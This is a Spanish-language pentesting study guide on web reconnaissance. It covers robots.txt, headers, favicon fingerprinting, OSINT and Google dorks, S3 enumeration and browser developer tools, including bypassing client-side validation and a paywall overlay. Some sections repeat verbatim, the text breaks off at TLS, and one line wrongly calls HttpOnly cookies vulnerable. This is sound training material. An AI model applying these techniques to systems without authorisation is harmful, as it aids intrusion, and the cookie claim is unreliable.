+<p><b> :radio_button: &nbsp; OSINT </b> Google Dorking, Wappalyzer, Wayback Machine, GitHub y S3 bucket enumeración </p>
+<p><b> :radio_button: &nbsp; Herramientas automatizadas (Reconocimiento activo)</b> fuerza bruta Para el descubimiento de directorios, subdominios y host virtuales </p>
+<p><b> :radio_button: &nbsp; Aplicar una metodología </b> estructurada de descubrimiento de contenido en una prueba de penetración </p>
+
+
+<!----------------------------------------------------------------------------- Descubrimiento Manual  ----------------------------------------------------------------------------->
+
+</br>
+
+
+<h2> Descubrimiento Manual </h2>
+
+
+</br>
+
+
+<h2> :white_check_mark: &nbsp;  Robots.txt </h2>
+
+
+<p>El archivo robots.txt es un archivo de texto que se coloca en la raíz de un sitio web para indicar a los rastreadores (como los de Google, Bing u otros bots) qué partes del sitio pueden o no pueden explorar. Estas páginas pueden ser áreas como portales de administración o archivos destinados a los clientes del sitio web </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/RZ2474yN/2.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p> En este caso se observa que en el archivo robots.txt especifica que ignore el directorio /wp-admin/. WP se refiere a que este sitio web esta ejecutando WordPress y admin es el directorio de administracion por lo tanto no debe ser de acceso publico</p>
+
+
+</br>
+
+
+<h2> :white_check_mark: &nbsp; Sitemap.xml </h2>
+
+<p> El archivo sitemap_index.xml es un mapa del sitio en formato XML que lista las páginas, imágenes, vídeos y otros recursos de un sitio web. Proporciona una lista de todos los archivos que el propietario del sitio web desea que aparezcan en un motor de búsqueda. En ocasiones, estos archivos pueden contener áreas del sitio web más difíciles de navegar o incluso incluir páginas web antiguas que el sitio actual ya no utiliza, pero que siguen funcionando en segundo plano. </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/DyNjCZg8/3.png" alt="Descripción de la imagen">
+
+</p>
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/FKp0BC4q/4.png" alt="Descripción de la imagen">
+
+</p>
+
+
+</br>
+
+
+
+
+<h2> :white_check_mark: &nbsp; Encabezados HTTP </h2>
+
+
+<p> Los encabezados HTTP son el "metadata silencioso" Cada respuesta del servidor contiene información crítica que el desarrollador olvidó ocultar. Estos encabezados a veces pueden contener información útil, como el software del servidor web y posiblemente el lenguaje de programación/scripting utilizado </p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/GppQxY1n/57.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<p> podemos ver que el servidor web usa NGINX versión 1.18.0 y PHP versión 7.4.3. Con esta información, podríamos encontrar versiones vulnerables del software utilizado. Adicionalmente, con el comando CURL descargar la informacion del servidor donde la opción -v habilita el modo detallado </p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/cCZCSRhK/59.png" alt="Descubrimiento con OSINT">
+
+</p>
+
+
+<p> Hay recursos externos disponibles que pueden ayudar a descubrir información sobre el sitio web de destino; estos recursos a menudo se denominan OSINT o (Inteligencia de código abierto), ya que son herramientas disponibles gratuitamente que recopilan información: </p>
+
+
+</br>
+
+
+
+<h2> :white_check_mark: &nbsp; Favicon </h2>
+
+
+<p> El favicon es un pequeño ícono que se muestra en la barra de direcciones o en la pestaña del navegador y se utiliza para marcar la marca de un sitio web. </p>
+
+<p> El Descubrimiento manual de Favicon es una técnica de enumeración de directorios y tecnologías que aprovecha el archivo favicon.ico (el ícono de la pestaña del navegador) para obtener información valiosa sobre la aplicación web.</p>
+
+
+<p> 1 &nbsp; Identificación de Frameworks y CMS</p>
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/mkfSQ5wP/53.png" alt="Descripción de la imagen">
+
+</p>
+
+<p> 2 &nbsp; Enumeración de Rutas Ocultas </p>
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/gkpDj1j5/54.png" alt="Descripción de la imagen">
+
+</p>
+
+<p> 3 &nbsp; Fingerprinting del Servidor Web </p>
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/5tX5DV7h/55.png" alt="Descripción de la imagen">
+
+</p>
+
+<p> 4 &nbsp; Detección de Subdirectorios Estáticos </p>
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/ZR38KLhw/56.png" alt="Descripción de la imagen">
+
+</p>
+
+
+</br>
+
+
+<p>  Pista sobre el framework en uso. </p>
+
+<p>  OWASP alberga una base de datos de iconos comunes de frameworks que se puede usar para comparar con el favicon de destino  : https://wiki.owasp.org/index.php/OWASP_favicon_database . Una vez que conocemos la pila del framework, podemos usar recursos externos para obtener más información</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/pL311pGW/48.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p> Realizando la validacion del codigo fuente del sitio web se puede confirma que este sitio está usando un favicon. Adicionalmente, verá que la línea que contiene un enlace al archivo images/favicon.ico.  </p>
+
+
+<p> Al ejecuntar el siguiente comando, descargará el favicon y obtendrá su valor hash md5 que luego podrá buscar en "https://wiki.owasp.org/index.php/OWASP_favicon_database ."</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/g23BQGfK/49.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/X748q9hF/50.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<p> En resumen: Un simple favicon puede revelar el stack tecnológico completo, rutas ocultas y hasta vulnerabilidades directas en minutos, sin necesidad de herramientas externas. </p>
+
+
+<p> Ejemplo Práctico en Pentesting </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/5tgpWgbY/51.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/mkzSMGM6/52.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<!----------------------------------------------------------------------------- OSINT  ----------------------------------------------------------------------------->
+
+
+
+
+<h2>  Recopilacion de informacion: (OSINT) </h3>
+
+</br>
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/2yHRhJ54/categorias-osint.jpg" alt="Descripción de la imagen">
+
+</p>
+
+
+<p> OSINT:&nbsp; Conjunto de tecnicas y herramientas para recopilar datos de fuentes disponibles de forma publica para ser utilizados en un contexto de inteligencia  </p>
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/c4bGJV2W/Recursos.jpg" alt="Descripción de la imagen">
+
+</p>
+
+
+<p> OSINT Framework: &nbsp; es un directorio o marco de trabajo que agrupa una amplia variedad de herramientas, recursos y técnicas utilizadas en la disciplina conocida como OSINT (Open Source Intelligence o Inteligencia de Fuentes Abiertas  </p>
+
+
+<p> Sirve como una guía estructurada y una colección de enlaces hacia herramientas específicas que permiten a los investigadores recopilar y analizar información proveniente de fuentes públicamente accesibles en Internet. Estas fuentes incluyen redes sociales, motores de búsqueda, registros públicos, foros, bases de datos gubernamentales, entre otros.  </p>
+
+
+<p> https://osintframework.com </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/GmF2LnYx/14.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+</br>
+
+
+<h2> :white_check_mark: &nbsp; Hackeo de Google / Dorking </h2>
+
+
+<p> Google Dorks son consultas de búsqueda avanzadas que utilizan operadores especiales de Google para encontrar información específica o vulnerabilidades en la web. Estas técnicas son comúnmente empleadas en pruebas de penetración, reconocimiento de información y detección de configuraciones incorrectas en sitios web. </p>
+
+<p> Los Google Dorks aprovechan operadores como site:, inurl:, intitle:, filetype:, entre otros, para refinar las búsquedas y obtener resultados más precisos </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/bryGnN2w/33.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<h4> 🛠 &nbsp; Pentest-tools (https://pentest-tools.com/) </h4>
+
+
+<p> Ofrece automatizacion de dorks organizados por categoria  </p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/MXkpD6nV/34.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<h4> 🛠 &nbsp; Exploit-db (https://www.exploit-db.com/google-hacking-database) </h4>
+
+
+<p> Base de datos con miles de dorks clasificados por servicio y tipo de vulnerabilidad </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/HWFwKb57/35.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<p> Operadores Comunes: </p>
+
+
+<p>1. site:: Limita los resultados a un dominio específico.</p>
+<p>•Ejemplo: site:google.com</p>
+
+<p>2. inurl:: Busca URLs que contengan una palabra clave específica.</p>
+<p>•Ejemplo: inurl:admin</p>
+
+<p>3. intitle:: Encuentra páginas cuyo título contenga ciertas palabras.</p>
+<p>•Ejemplo: intitle:"login"</p>
+
+<p>4. filetype:: Busca archivos de un tipo específico.</p>
+<p>•Ejemplo: filetype:pdf</p>
+
+<p>5.intext:: Busca páginas que contengan una palabra específica en su contenido.</p>
+<p>•Ejemplo: intext:"contraseña"</p>
+
+
+</br>
+
+
+
+<h2> :white_check_mark: &nbsp; Perfilar las tecnologias usadas por el sitio WEB </h2>
+
+
+<p> BuiltWith: &nbsp; Es una herramienta en línea que permite analizar cualquier sitio web para descubrir qué tecnologías utiliza: servidores, CMS, frameworks, librerías, herramientas de marketing, comercio electrónico entre otros </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/GhHwh9hP/5.png" alt="Descripción de la imagen">
+
+</p>
+
+<p> Wappalyzer: &nbsp; es una herramienta que identifica las tecnologías utilizadas en un sitio web, como CMS, frameworks, servidores, librerías de JavaScript, herramientas de analítica y más</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/PqmCxTMx/6.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<p> Netlas.io: &nbsp; es una plataforma de OSINT (Open Source Intelligence) y escaneo de Internet que permite descubrir, investigar y monitorear activos en línea. Se utiliza principalmente en ciberseguridad para analizar superficies de ataque, buscar dispositivos vulnerables y obtener información técnica de dominios, IPs y certificados SSL </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/tRhGM7Cr/7.png" alt="Descripción de la imagen">
+
+</p>
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/vTyksLHP/8.png" alt="Descripción de la imagen">
+
+</p>
+
+<p> WhatRuns: &nbsp; permite identificar las tecnologías que utiliza un sitio web: frameworks, CMS, plugins, herramientas de analítica, fuentes, redes publicitarias y más</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/Yq5gqnwx/9.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p> whatweb: &nbsp; sirve para identificar las tecnologías que utiliza un sitio web (CMS, frameworks, servidores, librerías, herramientas de analítica, etc.). Es una herramienta de ciberseguridad y pentesting que permite realizar un reconocimiento rápido de la infraestructura tecnológica de una página.</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/W3tpLVt1/10.png" alt="Descripción de la imagen">
+
+</p>
+
+
+</br>
+
+
+
+
+<h2> :white_check_mark: &nbsp; Pilas web modernas <b>MERN</b></h2>
+
+
+<p> Es un conjunto de cuatro tecnologías basadas en JavaScript que se usan para crear aplicaciones web completas </p>
+
+
+<p> Componentes de la Pila MERN </p>
+
+
+
+<p><b> MongoDB </b> Base de datos de tipo NoSQL que guarda la información en archivos parecidos a JSON.</p>
+
+<p><b> Express.js </b> Herramienta ligera para crear el servidor y ordenar las rutas o conexiones web. </p>
+
+<p><b> React: </b> Librería de JavaScript para armar la interfaz visual con bloques independientes o componentes. </p>
+
+<p><b> Node.js </b> Motor que permite ejecutar JavaScript fuera del navegador y poner en marcha el servidor. </p>
+
+<p> Una vez que conoces la pila y la versión, conoces la superficie de ataque. </p>
+
+
+
+
+<h2> :white_check_mark: &nbsp; <b> LAMP </b></h2>
+
+
+
+<p> es un conjunto de cuatro tecnologías de software diferentes que los desarrolladores utilizan para crear sitios web y aplicaciones web.</p>
+
+
+<p> Componentes de la Pila LAMP </p>
+
+
+
+<p><b> Linux </b> Es la base de todo el sistema. Controla el ordenador y los demás programas.</p>
+
+<p><b> Apache </b> Es el servidor web. Recibe las peticiones de los usuarios en internet y muestra las páginas. </p>
+
+<p><b> MySQL </b> Es la base de datos. Guarda la información del sitio web de forma segura.. </p>
+
+<p><b> PHP </b> Es el lenguaje de programación. Ayuda a que la página cambie y responda a las acciones del usuario </p>
+
+<p> Una vez que conoces la pila y la versión, conoces la superficie de ataque. </p>
+
+
+
+
+
+
+
+
+
+<h2> :white_check_mark: &nbsp;Wayback Machine </h2>
+
+
+<p> Wayback Machine: La Cápsula del Tiempo para Descubrimiento Web, (archive.org/web) es el archivo histórico más completo de internet con billones de capturas desde 1996. Revela páginas olvidadas, endpoints desindexados, funcionalidades ocultas y vulnerabilidades históricas. </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/65WS781B/60.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/XvSkCh79/61.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<p> Cómo Usarla en Pentesting </p>
+
+
+<p> 1 &nbsp; Acceso Rápido</p>
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/5tX6q5nv/62.png" alt="Descripción de la imagen">
+
+</p>
+
+<p> 2 &nbsp; Descubrimiento de Endpoints Ocultos </p>
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/XqkJ7s7F/63.png" alt="Descripción de la imagen">
+
+</p>
+
+<p> 3 &nbsp; Enumeración de Parámetros y Funcionalidades </p>
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/jdv5p317/64.png" alt="Descripción de la imagen">
+
+</p>
+
+<p> 4 &nbsp; Integración con DevTools + Headers </p>
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/wBRjsqj6/65.png" alt="Descripción de la imagen">
+
+</p>
+
+<p> Nota : Lo que estuvo público alguna vez, probablemente aún existe en el servidor. </p>
+
+
+
+<h2> :white_check_mark: &nbsp;GitHub </h2>
+
+<p> Git es un  sistema de control de versiones  que rastrea los cambios en los archivos de un proyecto. Trabajar en equipo es más fácil porque puedes ver lo que cada miembro del equipo está editando y qué cambios hicieron en los archivos. Cuando los usuarios terminan de hacer sus cambios, los confirman con un mensaje y luego los devuelven a una ubicación central (repositorio) para que los otros usuarios luego extraigan esos cambios a sus máquinas locales. GitHub es una versión alojada de Git en Internet. Los repositorios pueden configurarse como públicos o privados y tienen varios controles de acceso. Puedes usar la función de búsqueda de GitHub para buscar nombres de empresas o nombres de sitios web para intentar localizar repositorios que pertenecen a tu objetivo. Una vez descubierto, puedes tener acceso al código fuente, contraseñas u otro contenido que aún no habías encontrado. </p>
+
+
+
+<h2> :white_check_mark: &nbsp;S3 Buckets </h2>
+
+<p> Los buckets S3 son un servicio de almacenamiento proporcionado por Amazon AWS , que permite a las personas guardar archivos e incluso contenido estático de sitios web en la nube accesible a través de HTTP y HTTPS. El propietario de los archivos puede configurar permisos de acceso para que los archivos sean públicos, privados e incluso escribibles. A veces, estos permisos de acceso se configuran incorrectamente y, sin darse cuenta, permiten el acceso a archivos que no deberían estar disponibles para el público. </p>
+
+<p> El formato de los buckets S3 es http (s):// {name}. s3 .amazonaws.com  donde {name} lo decide el propietario, como  tryhackme-assets. s3 .amazonaws.com . Los buckets S3 se pueden descubrir de muchas maneras, como encontrar las URL en el código fuente de la página del sitio web, repositorios de GitHub o incluso automatizar el proceso. Un método de automatización común es usar el nombre de la empresa seguido de términos comunes como  {name} -assets,  {name} -www,  {name} -public,  {name} -private, etc. </p>
+
+
+</br>
+
+
+
+
+
+
+<!----------------------------------------------------------------------------- Codigo fuente de una aplicacion ----------------------------------------------------------------------------->
+
+
+<!--h1 without bottom border-->
+<div id="user-content-toc">
+  <ul align="center">
+    <summary><h1 style="display: inline-block">Playbook de pentesting </h1></summary>
+  </ul>
+</div>
+
+
+</br>
+
+
+<h2> :arrow_right: Caminando una aplicación </h2>
+
+
+</br>
+
+
+<h2> :white_check_mark: &nbsp; Visualización del código fuente de la página</h2>
+
+
+<p> El código fuente de una página web es el conjunto de instrucciones y líneas de texto escritas en lenguajes de programación (principalmente HTML, CSS y JavaScript) que le indican al navegador cómo debe estructurarse, visualizarse y comportarse un sitio web. </p>
+
+
+<p> Mientras visualiza un sitio web, puede hacer clic derecho en la página y verá una opción en el menú que dice Ver código fuente de la página.
+La mayoría de los navegadores admiten colocar view-source: delante de la URL, por ejemplo,  view-source:https://www.google.com/
+En el menú de tu navegador, encontrarás una opción para ver el código fuente de la página. Esta opción a veces se encuentra en submenús como "Herramientas para desarrolladores" o "Más herramientas".</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/bwc207Qy/40.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p> 1) &nbsp; En la parte superior de la página, verás código que empieza "<!--y termina con -->" estos comentarios. Los comentarios son mensajes que deja el desarrollador del sitio web, generalmente para explicar algo del código a otros programadores o incluso como notas o recordatorios para sí mismo. </p>
+
+
+<p> 2) &nbsp; Se pueden incluir archivos externos como CSS, JavaScript e imágenes mediante el código HTML. Existe la posibilidad que puedan obtener acceso al listado de archivos del directorio "/assets"  </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/zfNtQP1Y/41.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p> 3) &nbsp; Los enlaces a diferentes páginas en HTML se escriben en etiquetas de anclaje (son elementos HTML que comienzan con "< a), y el enlace al que será dirigido se almacena en el href atributo" . </p>
+
+
+<p> 4) &nbsp; Hoy en día, muchos sitios web no se crean desde cero y utilizan lo que se denomina un framework. Un framework es una colección de código prediseñado que permite a los desarrolladores incluir fácilmente funciones comunes que un sitio web requeriría, como blogs, gestión de usuarios, procesamiento de formularios y mucho más, ahorrándoles horas o días de desarrollo. </p>
+
+
+
+<h2> Herramientas para desarrolladores </h2>
+
+
+<p>  Se trata de un conjunto de herramientas que ayuda a los desarrolladores web a depurar aplicaciones y permite echar un vistazo a la estructura interna de un sitio web para ver qué sucede "F12" </p>
+
+
+</br>
+
+
+<h2> :white_check_mark: &nbsp; Developer Tools - Inspector </h2>
+
+
+<p> El Inspector (o Inspector de Elementos) es una de las herramientas más fundamentales para el desarrollo web y el análisis de seguridad. Su función principal es permitirte visualizar y manipular en tiempo real el DOM (Document Object Model) y el CSS (estilos) de una página web sin modificar el archivo original en el servidor. </p>
+
+
+<h3> Utilidad en Ciberseguridad y Pentesting </h3>
+
+
+<p> • Identificar campos ocultos: &nbsp; Localizar inputs de tipo type="hidden" que podrían contener tokens, IDs de sesión o parámetros manipulables. </p>
+<p> • Bypassing de validaciones cliente: &nbsp; Si un formulario tiene restricciones en el frontend (como maxlength, required o campos deshabilitados con disabled), puedes eliminarlos directamente en el Inspector para enviar payloads que el programador no previó.</p>
+<p> • Análisis de Event Listeners: &nbsp; Permite ver qué funciones de JavaScript están vinculadas a un botón o formulario, lo cual es útil para rastrear cómo se procesan los datos antes de ser enviados al servidor. </p>
+<p> • Detección de vulnerabilidades DOM-based XSS: &nbsp; Ayuda a rastrear cómo se renderizan datos controlados por el usuario dentro del HTML.</p>
+
+
+<p> En resumen, es la "radiografía" de la página web que te permite entender cómo está construida y cómo interactúa con el navegador. </p>
+
+
+<p> En este ejemplo podemos observar un sitio web el cual a sido bloqueado con un aviso flotante sobre el contenido que indica que es necesario ser cliente premium para verlo. Estos recuadros flotantes que bloquean el contenido de la página se conocen como muros de pago, ya que colocan un muro metafórico frente al contenido que se desea ver hasta que se paga.  </p>
+
+
+<p> Al hacer clic derecho en el aviso premium (muro de pago), debería poder seleccionar la opción "Inspeccionar" en el menú. Esta opción abre las herramientas de desarrollo en la parte inferior o derecha, según su navegador o preferencias. Ahora verá los elementos/HTML que componen el sitio web  </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/9MJ5BwzK/43.png" alt="Descripción de la imagen">
+
+</p>
+
+<p> Localiza el DIV elemento con la clase premium-customer-blockery haz clic en él. Verás todos los estilos CSS en el cuadro de estilos que se aplican a este elemento, como margin-top: 60pxy text-align: center. El estilo que nos interesa es el display: block. Si haces clic en la palabra block, puedes escribir un valor a tu elección, escribir none; esto hará que el cuadro desaparezca, revelando el contenido debajo. Si el elemento no tenía un campo de visualización, puedes hacer clic debajo del último estilo y añadir el tuyo. Recuerda que esto solo se edita en la ventana de tu navegador y, al pulsar "Actualizar", todo volverá a la normalidad.  </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/fW91LPfF/44.png" alt="Descripción de la imagen">
+
+</p>
+
+</br>
+
+<h2> :white_check_mark: &nbsp; Developer Tools - Console </h2>
+
+
+<p> La pestaña Consola le permite ejecutar fragmentos de JavaScript directamente en el contexto de la página, ver errores e interactuar con el DOM  </p>
+
+
+
+</br>
+
+
+<h2> :white_check_mark: &nbsp; Developer Tools - Debugger </h2>
+
+<p> El Inspector (o Inspector de Elementos) es una de las herramientas más fundamentales para el desarrollo web y el análisis de seguridad. Su función principal es permitirte visualizar y manipular en tiempo real el DOM (Document Object Model) y el CSS (estilos) de una página web sin modificar el archivo original en el servidor,  como evaluadores de penetración, nos permite analizar a fondo el código JavaScript. En Firefox y Safari, esta función se llama Depurador, pero en Google Chrome, Fuentes. </p>
+
+<h3> Utilidad en Ciberseguridad y Pentesting </h3>
+
+
+<p> • Entender la ofuscación: &nbsp; Muchos scripts maliciosos o protecciones de formularios están "ofuscados" (código difícil de leer). El Debugger permite ejecutar el código lentamente para ver qué hace realmente paso a paso. </p>
+<p> • Bypassing de controles de seguridad en el cliente: &nbsp; Si una aplicación realiza validaciones complejas de seguridad en JavaScript antes de enviar una petición, puedes pausar el código justo antes del envío, modificar los valores de las variables en memoria y luego reanudar la ejecución para enviar datos manipulados.</p>
+<p> • Análisis de APIs y Tokens: &nbsp; Puedes poner un breakpoint en la línea donde se generan las cabeceras de una petición para ver cómo se calculan firmas criptográficas o de dónde se extraen los tokens de sesión. </p>
+<p> • Manipulación del flujo: &nbsp; Puedes forzar que una condición if se cumpla (cambiando un false por true en la consola mientras está pausado) para acceder a funciones que normalmente estarían bloqueadas.</p>
+
+<p> En resumen, el Debugger es como un "microscopio" para el código en movimiento; te permite detener el tiempo y ver exactamente qué está pensando la aplicación en cualquier momento. </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/nL2RHdcc/45.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p> Muchas veces, al visualizar archivos JavaScript, notarás que todo está en una sola línea. Esto se debe a que se ha minimizado, lo que significa que se ha eliminado todo el formato (tabulaciones, espaciado y saltos de línea) para reducir el tamaño del archivo. Podemos recuperar algunos de los formatos usando la opción "Pretty Print", que se presenta como dos llaves { } para facilitar la lectura, aunque debido a la ofuscación, sigue siendo difícil comprender qué sucede con el archivo. Si se desplaza hasta el final del archivo flash.min.js, verá la línea:flash['remove'](); </p>
+
+<p>  Este pequeño fragmento de JavaScript es lo que elimina la ventana emergente roja de la página. Podemos utilizar otra función del depurador llamada  puntos de interrupción . Estos son puntos en el código que podemos obligar al navegador a detener el procesamiento de JavaScript y pausar la ejecución actual.</p>
+
+<p>  Si hace clic en el número de línea que contiene el código anterior, verá que se vuelve azul; ha insertado un punto de interrupción en esta línea. Ahora, intente actualizar la página y verá que el cuadro rojo permanece en la página en lugar de desaparecer, y que contiene una bandera.</p>
+
+
+</br>
+
+
+<h2> :white_check_mark: &nbsp; Developer Tools - Network </h2>
+
+
+<p> La pestaña Network (Red) es quizás la herramienta más crítica para entender la comunicación entre el navegador y el servidor. Su función es registrar y mostrar todas las peticiones (requests) y respuestas (responses) que realiza la página web. </p>
+
+<h3> Utilidad en Ciberseguridad y Pentesting </h3>
+
+
+<p> • Identificación de Endpoints de AP &nbsp; Revela rutas de API ocultas que no son visibles en el código fuente pero que la aplicación utiliza para obtener o enviar datos. </p>
+
+<p> • Análisis de Autenticación:  &nbsp; Permite ver cómo se transmiten las credenciales. ¿Se envían en la URL? ¿En una cookie con el flag HttpOnly? ¿En una cabecera personalizada?</p>
+
+<p> • Replay de Peticiones: &nbsp; La mayoría de navegadores permiten hacer clic derecho sobre una petición y seleccionar "Copy as fetch" o "Copy as cURL". Esto te permite recrear la petición exacta en tu propia terminal o script para probar vulnerabilidades como IDOR (Insecure Direct Object Reference). </p>
+
+<p> • Inspección de WebSockets: &nbsp; Permite ver el flujo de datos bidireccional en tiempo real, muy común en chats, dashboards financieros o juegos online.</p>
+
+<p> Con la pestaña de red abierta, se rellena el formulario de contacto y se pulsa el botón "Enviar mensaje" . Verás un evento en la pestaña de red: el formulario se envía en segundo plano mediante AJAX. AJAX permite enviar y recibir datos de red en segundo plano en una aplicación web sin modificar la página web actual. </p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/NGN0yTjz/46.png" alt="Descripción de la imagen">
+
+</p>
+
+<p> Examine la nueva entrada en la pestaña de red que creó el formulario de contacto y vea la página a la que se enviaron los datos </p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/T3b2H4J8/47.png" alt="Descripción de la imagen">
+
+</p>
+
+
+</br>
+
+<h2> :white_check_mark: &nbsp; Developer Tools - Sources  </h2>
+
+
+<p> La pestaña Fuentes le permite explorar archivos JavaScript, CSS y HTML cargados por la página. Esta es una de las técnicas de reconocimiento más prácticas disponibles a través del navegador. Los archivos fuente de JavaScript con frecuencia contienen códigos duros API puntos finales, estructuras de directorios, referencias a servicios internos y comentarios de desarrolladores que nunca tuvieron la intención de ser públicos. Al inspeccionar estos archivos puede aparecer información que es invisible en la página renderizada. Utilizarás esta técnica en las preguntas siguientes. </p>
+
+</br>
+
+<h2> :white_check_mark: &nbsp; Developer Tools - Application  </h2>
+
+
+<p> La pestaña Aplicación, en la sección Almacenamiento, le permite inspeccionar las cookies, el almacenamiento local y el almacenamiento de sesión. Estas áreas de almacenamiento a veces contienen tokens de sesión, APILas claves expusieron accidentalmente el seguimiento del lado del cliente ID, o datos de autenticación.  </p>
+
+</br>
+
+
+<h2> :white_check_mark: &nbsp; Developer Tools - Security  </h2>
+
+
+<p> La pestaña Seguridad proporciona detalles del certificado, incluido el emisor, el período de validez y los nombres alternativos de sujeto (SAN). Las SAN con frecuencia revelan subdominios adicionales o dominios relacionados que pertenecen a la misma organización. </p>
+
+</br>
+
+
+<h2> :white_check_mark: &nbsp; Developer Tools - Sources  </h2>
+
+
+<p> La pestaña Fuentes le permite explorar archivos JavaScript, CSS y HTML cargados por la página. Esta es una de las técnicas de reconocimiento más prácticas disponibles a través del navegador. Los archivos fuente de JavaScript con frecuencia contienen códigos duros API puntos finales, estructuras de directorios, referencias a servicios internos y comentarios de desarrolladores que nunca tuvieron la intención de ser públicos. Al inspeccionar estos archivos puede aparecer información que es invisible en la página renderizada. Utilizarás esta técnica en las preguntas siguientes. </p>
+
+</br>
+
+
+<h2> :white_check_mark: &nbsp; Developer Tools - Application  </h2>
+
+
+<p> La pestaña Aplicación, en la sección Almacenamiento, le permite inspeccionar las cookies, el almacenamiento local y el almacenamiento de sesión. Estas áreas de almacenamiento a veces contienen tokens de sesión, APILas claves expusieron accidentalmente el seguimiento del lado del cliente ID, o datos de autenticación.  </p>
+
+</br>
+
+
+<h2> :white_check_mark: &nbsp; Developer Tools - Security  </h2>
+
+
+<p> La pestaña Seguridad proporciona detalles del certificado, incluido el emisor, el período de validez y los nombres alternativos de sujeto (SAN). Las SAN con frecuencia revelan subdominios adicionales o dominios relacionados que pertenecen a la misma organización. </p>
+
+</br>
+
+<h2> :white_check_mark: &nbsp; Developer Tools - Security  </h2>
+
+
+<p> La pestaña Seguridad proporciona detalles del certificado, incluido el emisor, el período de validez y los nombres alternativos de sujeto (SAN). Las SAN con frecuencia revelan subdominios adicionales o dominios relacionados que pertenecen a la misma organización. </p>
+
+</br>
+
+<h2> :white_check_mark: &nbsp; Developer Tools - Almacenamiento/storage  </h2>
+
+
+<p> La pestaña Almacenamiento en las herramientas para desarrolladores permite ver y administrar los datos que un sitio web almacena en nuestro navegador. Estos datos se almacenan en el lado del cliente y pueden contener información confidencial o interesante útil durante una prueba manual. Como pentesters, verificar el almacenamiento del navegador nos ayuda a comprender cómo la aplicación maneja la autenticación, los datos de sesión, las preferencias del usuario y otros valores almacenados.  </p>
+
+
+<p>Opciones relevantes</p>
+
+<p>:radio_button: <b> Almacenamiento local:</b> almacena datos de forma persistente en el navegador, incluso después de cerrarlo.</p>
+<p>:radio_button: <b> Almacenamiento de sesión:</b> almacena datos temporalmente para una sola pestaña/sesión del navegador.</p>
+<p>:radio_button: <b> Cookies</b>: Pequeños datos enviados por el servidor y almacenados en el navegador, utilizados frecuentemente para sesiones y autenticación.</p>
+<p>:radio_button: <b> Almacenamiento en caché:</b> almacena recursos almacenados en caché como imágenes, scripts y respuestas API para una carga más rápida</p>
+
+
+
+<p> las cookies se encuentran entre las más importantes para un pentester  </p>
+
+
+<p> Las cookies son pequeños archivos de texto que los sitios web almacenan en el navegador del usuario para recordar información de sesión o preferencias. Pueden ser usadas para autenticación, personalización o rastreo. Un atacante puede explotar cookies vulnerables (como HttpOnly o sin Secure) para secuestrar sesiones o robar credenciales. </p>
+
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/JntvgSSx/283.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+
+
+
+
+<h2>:white_check_mark: Seguridad de la capa de transporte (TLS) </h2> 
+
+
+
+<p><b>  SSL (Secure Sockets Layer)</b>: es un protocolo de seguridad que cifra la comunicación entre un cliente y un servidor, garantizando privacidad, autenticación e integridad de los datos. Aunque hoy ha sido reemplazado por su versión más moderna </p>
+
+
+
+
